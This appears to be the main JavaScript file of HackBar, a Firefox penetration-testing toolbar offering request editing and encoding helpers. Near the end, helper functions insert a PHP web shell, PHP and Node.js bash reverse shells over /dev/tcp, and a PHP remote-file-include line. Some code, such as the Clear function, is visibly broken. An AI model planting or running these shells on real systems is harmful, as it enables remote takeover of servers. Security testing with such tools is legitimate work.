HackBar.Load = function ( myWindow )
{
  this.construct( myWindow );
}

HackBar.Main.prototype = {

  field             : null,
  postDataField     : null,
  referrerDataField : null,
  currentFocusField : null,
  toolbar           : null,
  myWindow          : null,
  BrowserWindow     : null,
  TabBrowser        : null,
  tabManager        : null,
  anonFocusFunct    : null,

  construct: function ( myWindow )
  {
    this.myWindow = myWindow;

    const kWindowMediatorContractID = "@mozilla.org/appshell/window-mediator;1";
    const kWindowMediatorIID        = Components.interfaces.nsIWindowMediator;
    const kWindowMediator           = Components.classes[kWindowMediatorContractID].getService(kWindowMediatorIID);

    this.BrowserWindow = kWindowMediator.getMostRecentWindow("navigator:browser");
    this.TabBrowser    = this.BrowserWindow.getBrowser();

    this.myWindow.addEventListener( "load",   this, false );
    this.myWindow.addEventListener( "unload", this, false );
  },
  handleEvent: function( event )
  {
    if( !this.myWindow || !this.myWindow.document ) return;
    switch( event.type )
    {
      case "load":        if( event.currentTarget == this.myWindow ) this.init( event ); break;
      case "unload":      this.destruct( event ); break;
      case "click":       break;
      case "dblclick":    break;
      case "select":      break;
      case "command":     break;
      case "popuphidden": break;
      case "blur":        break;
      case "change":      break;
      case "dragover":    break;
      case "dragdrop":    break;
    }
  },

  init: function ( event )
  {
        // Here we do first run globally, Show firstrun page.
    if (Services.prefs.getBoolPref("extensions.hackbar.firstrun") == false){
      Services.prefs.setBoolPref("extensions.hackbar.firstrun", true);
      try {
        if (typeof openUILinkIn != "undefined") {
          setTimeout(function() {
            // Open next to current tab so user can see the first run page, User may not see the page it they have allot of tabs.
            openUILinkIn("chrome://hackbar/how-to-use/index.html", "tab", { 
              relatedToCurrent: true 
            });
          }, 2000); // Wait 2 seconds before showing to allow time after browser restart.
        }
      } catch(e){
        
      }
    }
    // Listen for addon uninstall and clear firstrun preference.
  try {
    AddonManager.addAddonListener({
      onUninstalling: function(addon){
        if (addon.id === "ph.hitachi@hackbar.com"){
          Services.prefs.clearUserPref("extensions.hackbar.firstrun");
        }
      }
    });
  } catch(e){
    
  }	  
    //let currentTabId = chrome.devtools.inspectedWindow.tabId;
    this.urlField      = document.getElementById("hackBarTargetUrl");
    this.postDataField = document.getElementById("hackBarTargetUrlPostField");
    this.referrerField = document.getElementById("hackBarTargetUrlReferrerField");
    this.cookieField   = document.getElementById("hackBarTargetUrlCookieField");
    this.toolbar       = document.getElementById("hackBarToolbar");
    this.initTabManager();
  },

  initTabManager: function ()
  {
    this.tabManager = new HackBar.TabManagement();
  },

  destruct: function ()
  {
    var me = this;
    anonFocusFunct = function ( event ) { me.onFieldFocus( event ); }
    this.urlField.removeEventListener(      'focus', anonFocusFunct, false );
    this.postDataField.removeEventListener( 'focus', anonFocusFunct, false );
    this.referrerField.removeEventListener( 'focus', anonFocusFunct, false );
    this.cookieField.addEventListener( 'focus', anonFocusFunct, false );
    
    this.cookieField.addEventListener(      'click', this.onFieldClick, false );
    this.urlField.removeEventListener(      'click', this.onFieldClick, false );
    this.postDataField.removeEventListener( 'click', this.onFieldClick, false );
    this.referrerField.removeEventListener( 'click', this.onFieldClick, false );
    this.myWindow.removeEventListener( "load",   this, false );
    this.myWindow.removeEventListener( "unload", this, false );
  },

  onFieldFocus: function ( event )
  {
    this.currentFocusField = event.currentTarget;
  },

  onFieldClick: function ( event )
  {
    event.currentTarget.focus();
  },

  toggleBar: function ()
  {
    var newState = !this.toolbar.hidden;
    this.toolbar.hidden = newState;
    if ( !newState ) {
      if ( this.urlField.value.length < 1 ) {
        this.useCurrentUrl();
        this.splitUrl();
      }
      var me = this; // Ugly fix, but it works :)
      setTimeout ( function () { me.currentFocusField.focus(); }, 100 );
    }
  },

loadUrl: function ()
  {
    var uri = this.urlField.value;
    uri = uri.replace( new RegExp(/\n|\r/g), '' );  
    // BASE64 CHECK
  var str = uri;
  if(str.indexOf("[BASE64]=") != -1){ 
    var BaseCorrectCheck = uri.match(/\]/g).length;
    var BaseCorrectCheck2 = uri.match(/\[/g).length;
    if(BaseCorrectCheck == '2' && BaseCorrectCheck2 == '1'){    
      if(document.getElementById('main_toogle').checked){txt = 'hackBarTargetUrl'};
      if(document.getElementById('ref_toogle').checked){txt = 'hackBarTargetUrlReferrerField'};
      if(document.getElementById('post_toogle').checked){txt = 'hackBarTargetUrlPostField'};
      if(document.getElementById('cookie_toogle').checked){txt = 'hackBarTargetUrlCookieField'};         
      ActiveQuery = document.getElementById(txt).value;
      
      // FIND STRING TO SPACE IN SPACER
      var findBaseStringStart = ActiveQuery.lastIndexOf("\=") + 1;
      var findBaseStringEnd = ActiveQuery.lastIndexOf("\]");  
      var StringToBase = ActiveQuery.substring(findBaseStringStart, findBaseStringEnd);
      
      // FIND STRING TO SPACE IN SPACER
      var findBaseSpacerStart = ActiveQuery.lastIndexOf("\[");
      var findBaseSpacerEnd = ActiveQuery.lastIndexOf("\]") + 1;  
      var BaseSpacer = ActiveQuery.substring(findBaseSpacerStart, findBaseSpacerEnd);
      
      // REPLACE STRINGTOBASE WITH BASED STRING
      var newString = HackBar.Encrypt.base64Encode(StringToBase);
      var oldWordRegEx = new RegExp(BaseSpacer.replace(/[.^$*+?()[{\|]/g,'\\$&'),'g');
      var uri = ActiveQuery.replace(oldWordRegEx,newString);
      
      // EXECUTE
      if (uri.indexOf("http://") == -1 && uri.indexOf("https://") == -1) uri = 'http://' + uri;
      var postData = this.getPostDataFromField();
      var referrer = this.getReferrerFromField();
      var cookie   = this.getCookieFromField();
      loadURI( uri, referrer, cookie, postData, true );
      this.currentFocusField.focus();           
    }else{
        alert('[Base64 Spacer Error-Message #1]\n\nPlease do not use \"[\" or \"]\" outside the spacer when using Base64-Spacer');
    };    
  // EXECUTE WITHOUT USER BASE SPACER
  }else{  
    var uri = this.urlField.value;
    uri = uri.replace( new RegExp(/\n|\r/g), '' );
    if (uri.indexOf("http://") == -1 && uri.indexOf("https://") == -1) uri = 'http://' + uri;
    var postData = this.getPostDataFromField();
    var referrer = this.getReferrerFromField();
    var cookie   = this.getCookieFromField();
    loadURI( uri, referrer, cookie, postData, true );
    this.currentFocusField.focus();
  };
  /*chrome.runtime.sendMessage({
        tabId: currentTabId,
        action: 'send_requests',
        data: {headers: Headers}
    });*/
  },

  getReferrerFromField: function ()
  {
    if ( !document.getElementById('hackBar_referrerCheckBox').checked || !this.referrerField.value ) return null;
    var referrerStr = this.referrerField.value.replace( new RegExp(/\n|\r/g), '' );
    if ( !referrerStr || referrerStr.length <= 0 ) return null;
    const ref_uri = Components.Constructor("@mozilla.org/network/standard-url;1", "nsIURI");
    var ref = new ref_uri;
    ref.spec = referrerStr;
    return ref;
  },

  getPostDataFromField: function ()
  {
    var dataString = this.postDataField.value;
    if ( !document.getElementById('hackBar_postDataCheckBox').checked || !dataString ) return null;
    dataString = dataString.replace( new RegExp(/\n|\r/g), '' );
	dataString = dataString.replace( new RegExp(/\+/g), "%2B" );

    const Cc = Components.classes;
    const Ci = Components.interfaces;
    var stringStream = Cc["@mozilla.org/io/string-input-stream;1"].
                       createInstance(Ci.nsIStringInputStream);
    if ("data" in stringStream) // Gecko 1.9 or newer
      stringStream.data = dataString;
    else // 1.8 or older
      stringStream.setData(dataString, dataString.length);

    var postData = Cc["@mozilla.org/network/mime-input-stream;1"].
                   createInstance(Ci.nsIMIMEInputStream);

    postData.addHeader("Content-Type", "application/x-www-form-urlencoded");
    postData.addContentLength = true;
    postData.setData( stringStream );
    return postData;
  },
  getCookieFromField: function(){
    //alert('test');
  },
  Clear: function(){
    var clearBtn = this.urlField;
    if (clearBtn) {
      clearBtn.setAttribute("value", "test123");
    }else{
      clearBtn.setAttribute("label", "Clear All");
    }
    var url = this.urlField.value;
    if(url == ''){
        alert('this already no have value');
    }
     this.urlField.value = '';
     this.postDataField.value = '';
     this.referrerField.value = '';
     this.cookieField.value = '';
     */
  },
  /*addquery: function(){
    //
    var query1 =  prompt("Please Enter Query","test");
    var query = Services.prefs.setCharPref("extensions.hackbar.query1", query1)
  },*/
  useCurrentUrl: function ( mmessage ) {
    var sessionHistory = this.TabBrowser.selectedBrowser.webNavigation.sessionHistory;
    if( sessionHistory.index == -1 ) return;

    var entry = sessionHistory.getEntryAtIndex(sessionHistory.index, 0);
    entry = entry.QueryInterface(Components.interfaces.nsISHEntry);

    var postString = '';
    if ( entry.postData ) {
      try {
          var postDataStream = entry.postData;
          postDataStream.QueryInterface(Components.interfaces.nsISeekableStream).seek(0, 0);

          //create an input stream for reading the post data from
          var inputStream = Components.classes["@mozilla.org/scriptableinputstream;1"].createInstance(Components.interfaces.nsIScriptableInputStream);
          inputStream.init( entry.postData );
          var postData = inputStream.read( 0xFFFFFFFF );
          var postArray = postData.split("\r\n\r\n");
          postArray.shift();
          postString = postArray.join( '\n' );
      } catch( e ) {
        // do nothing
      }
    }

    var referringUri = entry.referrerURI;
    if ( referringUri ) {
      referringUri = referringUri.QueryInterface(Components.interfaces.nsIURI);
      referringUri = referringUri.spec;
    } else {
      referringUri = "";
    }

    this.urlField.value = unescape(entry.URI.spec);
    this.postDataField.value = postString;
    this.referrerField.value = referringUri;
  //  this.getVatSetCookies();
    this.urlField.focus();
  },
 /*getVatSetCookies: function (values) {
  var x = 0;
  while (context.targetRespo­nse.headers['Set-Coo­kie'][x]){
  context.setVariable(­"x-set-cookie-" + x + ".content", context.targetRespon­se.headers['Set-Cook­ie'][x]);
  x++;
  }
  x = 0;
    while (context.proxyRespon­se.headers['Set-Cook­ie'][x]){
    context.setVariable(­"x-set-cookie-" + x + ".content", context.proxyRespons­e.headers['Set-Cooki­e'][x]);
    x++;
  }
},*/
  splitUrl: function ()
  {
    var uri = this.currentFocusField.value;
    uri = uri.replace(new RegExp(/&/g), "\n&");
    uri = uri.replace(new RegExp(/\?/g), "\n?");
    this.currentFocusField.value = uri;
    return true;
  },

  getSelectedText: function ()
  {
    var selectionStart = this.currentFocusField.selectionStart;
    var selectionEnd = this.currentFocusField.selectionEnd;
    if ( selectionEnd - selectionStart < 1 ) {
      return prompt( "No text was selected for the requested action", "String to use" );
    } else {
      return this.currentFocusField.value.substr( selectionStart, selectionEnd - selectionStart );
    }
  },

  setSelectedText: function ( str )
  {
    var selectionStart = this.currentFocusField.selectionStart;
    var selectionEnd = this.currentFocusField.selectionEnd;
    var pre = this.currentFocusField.value.substr( 0, selectionStart );
    var post = this.currentFocusField.value.substr( selectionEnd, this.currentFocusField.value.length );
    this.currentFocusField.value = pre + str + post;
    this.currentFocusField.selectionStart = selectionStart;
    this.currentFocusField.selectionEnd = selectionStart + str.length;
  },

  /** Field toggle functions **/
  togglePostField: function ()
  {
    var box = document.getElementById("hackBar_postDataCheckBox");
    var field = document.getElementById("hackBarTargetUrlPost");
    field.hidden = !box.checked;
  },

  toggleReferrerField: function ()
  {
    var box = document.getElementById("hackBar_referrerCheckBox");
    var field = document.getElementById("hackBarTargetUrlReferrer");
    field.hidden = !box.checked;
  },
  toggleCookieField: function ()
  {
    var box = document.getElementById("hackBar_cookieCheckBox");
    var field = document.getElementById("hackBarTargetUrlCookie");
    field.hidden = !box.checked;
  },

  /** Section functions **/
  selectionToChar: function ( dbEngine )
  {
    var charStringArray = new Array;
    var txt = this.getSelectedText();
    var decimal;
    for ( var c = 0 ; c < txt.length ; c++ ) {
      decimal = txt.charCodeAt( c );
      charStringArray.push( decimal );
    }

    var charString = '';

    switch ( dbEngine )
    {
      case "stringFromCharCode":
        charString = 'String.fromCharCode(' + charStringArray.join(', ') + ')';
        break;
      case "htmlChar":
        charString = '&#' + charStringArray.join(';&#') + ';';
        break;
    }
    this.setSelectedText( charString );
  },

  selectionNumberChange: function ( add )
  {
    var comboBox = document.getElementById("hackBarPlusMinusSelection");
    var selection = comboBox.selectedItem.label.toString();
    var txt = this.getSelectedText();
    var originalLength = txt.length;
    var result;

    switch ( selection ) {
      case "INT":
        var integer = parseInt(txt, 10);
        result = integer + add;
        break;
      case "HEX":
        var integer = parseInt(txt, 16);
        result = HackBar.Toolbox.dec2hex( HackBar.Toolbox.hex2dec( txt )  + add );
        break;
      case "OCT":
        var integer = parseInt(txt, 8);
        result = HackBar.Toolbox.dec2oct( HackBar.Toolbox.oct2dec( txt )  + add );
        break;
      case "Alphabet":
        var integer = parseInt(txt);
        result = HackBar.Toolbox.dec2alphabet( (HackBar.Toolbox.alphabet2dec( txt ) + add) % 26 );
        break;
      case "AlNum":
        var integer = parseInt(txt);
        result = HackBar.Toolbox.dec2alphanum( (HackBar.Toolbox.alphanum2dec( txt ) + add) % 36 );
        break;
    }

    result = result.toString();
    var padding = (originalLength - result.length);
    
    if ( result == "NaN" ) return;

    // Ensure the prepending 0s when increasing/decreasing numbers
    for(var i = 0; i < padding; i++)
    {
      result = "0".concat(result);
    }

    this.setSelectedText( result );
    this.loadUrl();
  },

selectionToMD5: function ( ) {
    var txt = this.getSelectedText();
    var md5_str = HackBar.Encrypt.md5(txt);
    this.setSelectedText( md5_str );
  },

  

selectionToSHA: function ( sha_type ) {
    var txt = this.getSelectedText();
    var sha_str = (sha_type == 1) ? HackBar.Encrypt.sha1(txt) : HackBar.Encrypt.sha2(txt);;
    this.setSelectedText( sha_str );
  },

  selectionToURL: function ( encodeOrDecode )
  {
    var txt = this.getSelectedText();
    var newString = ( encodeOrDecode == 'encode' ) ? escape(txt) : unescape(txt);
    if ( encodeOrDecode == 'encode' ) {
      newString = newString.replace(/\*/g,'%2a');
      newString = newString.replace(/\//g,'%2f');
      newString = newString.replace(/\+/g,'%2b');
    }
    this.setSelectedText( newString );
  },

  selectionToBase64: function ( encodeOrDecode )
  {
    var txt = this.getSelectedText();
	var txt = txt.replace(/\ /g,' ');
    var newString = ( encodeOrDecode == 'encode' ) ? HackBar.Encrypt.base64Encode(txt) : HackBar.Encrypt.base64Decode(txt);
    this.setSelectedText( newString );
  },

  selectionToRot13: function ()
  {
    var txt = this.getSelectedText();
    this.setSelectedText( HackBar.Encrypt.rot13( txt ) );
  },

  /* T.PRO HEX-ENCODING FUNCTIONS */
  stringToURL: function ( separator )
  {
    var txt = this.getSelectedText();
    var charStringArray = new Array;
    var decimal;
    for ( var c = 0 ; c < txt.length ; c++ ) {
      decimal = txt.charCodeAt( c );
      charStringArray.push( HackBar.Toolbox.dec2hex( decimal ) );   
    }
  txt = '%' + charStringArray.join( '%' );
  txt = txt.replace(/\%2b/g, "%20");
  txt = txt.replace(/\%a/g, "");
    this.setSelectedText( txt);
  }, 
  UrlToString: function ()
  {
    var txt = this.getSelectedText().toLowerCase();
  txt = txt.replace( /%/g, '' );
    txt = txt.replace( /[^0-9abcdefg]/g, '' );

    var charStringArray = new Array();
    var buffer = '';
    var result = '';
    for ( var c = 0 ; c < txt.length ; c++ ) {
      buffer += txt.charAt( c ).toString();
      if ( buffer.length >= 2 ) {
        result += String.fromCharCode( HackBar.Toolbox.hex2dec( buffer ) );
        buffer = '';
      }
    }
    this.setSelectedText( result );
  },  
  StringTo0x: function ( separator )
  {
    var txt = this.getSelectedText();
    var charStringArray = new Array;
    var decimal;
    for ( var c = 0 ; c < txt.length ; c++ ) {
      decimal = txt.charCodeAt( c );
      charStringArray.push( HackBar.Toolbox.dec2hex( decimal ) );
    }
    this.setSelectedText( '0x' + charStringArray.join( separator ) );
  },
  NULLxToString: function ()
  {
    var txt = this.getSelectedText().toLowerCase();
    txt = txt.replace( /0x/g, '' );
  txt = txt.replace( /[^0-9abcdefg]/g, '' );
    var charStringArray = new Array();
    var buffer = '';
    var result = '';
    for ( var c = 0 ; c < txt.length ; c++ ) {
      buffer += txt.charAt( c ).toString();
      if ( buffer.length >= 2 ) {
        result += String.fromCharCode( HackBar.Toolbox.hex2dec( buffer ) );
        buffer = '';
      }
    }
    this.setSelectedText( result );
  /* END */
  },

  hexEncoding: function ( separator )
  {
    var txt = this.getSelectedText();
    var charStringArray = new Array;
    var decimal;
    for ( var c = 0 ; c < txt.length ; c++ ) {
      decimal = txt.charCodeAt( c );
      charStringArray.push( HackBar.Toolbox.dec2hex( decimal ) );
    }
    this.setSelectedText( charStringArray.join( separator ) );
  },

  hexDecoding: function ()
  {
    var txt = this.getSelectedText().toLowerCase();
    txt = txt.replace( /[^0-9abcdefg]/g, '' );

    var charStringArray = new Array();
    var buffer = '';
    var result = '';
    for ( var c = 0 ; c < txt.length ; c++ ) {
      buffer += txt.charAt( c ).toString();
      if ( buffer.length >= 2 ) {
        result += String.fromCharCode( HackBar.Toolbox.hex2dec( buffer ) );
        buffer = '';
      }
    }
    this.setSelectedText( result );
  },

  NumberToHex: function ()
  {
    var number = parseInt(this.getSelectedText());
    this.setSelectedText( HackBar.Toolbox.dec2hex( number ) );
  },

  HexToNumber: function ()
  {
    var hex = this.getSelectedText();
    this.setSelectedText( HackBar.Toolbox.hex2dec( hex ) );
  },
  Base64spacer: function ()
  {
    var txt = this.getSelectedText();
    var txt = txt.replace(/\ /g,' ');
    var base64spacer = HackBar.Encrypt.base64Decode(txt);
    this.setSelectedText('[BASE64]='+base64spacer+']');
  },
  adjustFieldSize: function ( add, fieldId )
  {
    var field = document.getElementById(fieldId);
    var rows = parseInt(field.getAttribute( "rows" ));
    var newrows = ((rows + add) <= 1) ? 1 : rows + add;
    if ( newrows < 3 ) newrows = 3;
    field.setAttribute( "rows", newrows );
  },

  getUsefullString: function ( key )
  {
    this.setSelectedText( this.hackBarUsefullStrings[key] );
  },
  
  // Used by Overflow menu option.
  // Returns a 'A's string to test overflows and application limits
  generateOverflowString: function ( stringLength )
  {
    var result = "";
    
    while(stringLength < 1)
    {
      stringLength = prompt("Length of the string to use in the overflow:","1337");
      stringLength = Math.min(4096, parseInt( stringLength ));
    }
    
    for (var i=0; i < stringLength; i++)
    {
      result += "A";
    }
    this.setSelectedText( result );
  },
  
  // Reverse a string 
  reverseString: function ( ){
    var originalString = this.getSelectedText();
    var splitext = originalString.split("");
    var revertext = splitext.reverse();
    var reversed = revertext.join("");
    this.setSelectedText( reversed );
  },
  
  lowercaseString : function () {
    var txt = this.getSelectedText();
    this.setSelectedText( txt.toLowerCase() )    
	},
	uppercaseString : function () {
    var txt = this.getSelectedText();
    this.setSelectedText( txt.toUpperCase() )
    },
	
    randomcaseString : function () {
    var txt = this.getSelectedText();
    var newString = ""
    for(i = 0;i<txt.length;i++){
      var rand = Math.random()*10;
      if(rand > 5){
        newString += txt.charAt(i).toUpperCase();
      } else {
        newString += txt.charAt(i).toLowerCase();
      }
    }
    this.setSelectedText( newString )
    },
  
  phpbackdoor : function () {
    this.setSelectedText( "<?php echo system($_GET[\"cmd\"]); ?>" )
   },
   
  phprevshell : function () {
    var ip = prompt("IP Address?");
    var port = prompt("Port?");
    this.setSelectedText( "<?php system(\"bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\"); ?>" )
    },
	
 phprfi : function () {
    this.setSelectedText( "<?php include($_GET[\"file\"]); ?>" )
   },
  
 nodejsrevshell : function () {
     var ip = prompt("IP Address:");
    var port = prompt("Port:");
    this.setSelectedText("require('child_process').exec('bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1')");
   },
   
 stripcustom : function () {
    var str = prompt("String you would like to remove:")
    var txt = this.getSelectedText();
    var re = new RegExp(str, 'g');
    var newString = txt.replace(re, '');
    this.setSelectedText( newString ); 
	  },
  
  
  addslashes : function () {
    var txt = this.getSelectedText();
    txt = txt.replace(/\\/g,'\\\\');
    txt = txt.replace(/\'/g,"\\'");
    txt = txt.replace(/\"/g,'\\"');
    this.setSelectedText( txt );
  },

  stripslashes : function () {
    var txt = this.getSelectedText();
    txt = txt.replace(/\\'/g,'\'');
    txt = txt.replace(/\\"/g,'"');
    txt = txt.replace(/\\\\/g,'\\');
    this.setSelectedText( txt );
  },

  stripspaces : function () {
    var txt = this.getSelectedText();
      var re = new RegExp(" ", 'g');
      var newString = txt.replace(re, '');
      this.setSelectedText( newString );
  },
  
  binaryencode : function () {
      var txt = this.getSelectedText();
      var encode = HackBar.Encrypt.toBinary(txt);
      var newString = encode.replace(/\s+/g, '');
      this.setSelectedText( "0b" + newString );
     },
    
	binarydecode : function () {
      var txt = this.getSelectedText();
      var remove = txt.replace(/0b/g, '');
      var space = remove.replace(/\s+/g, '');
      var addspace = space.match(/.{1,8}/g).join(" ");
      var decode = HackBar.Encrypt.fromBinary(addspace);
      this.setSelectedText( decode );
	  }
};
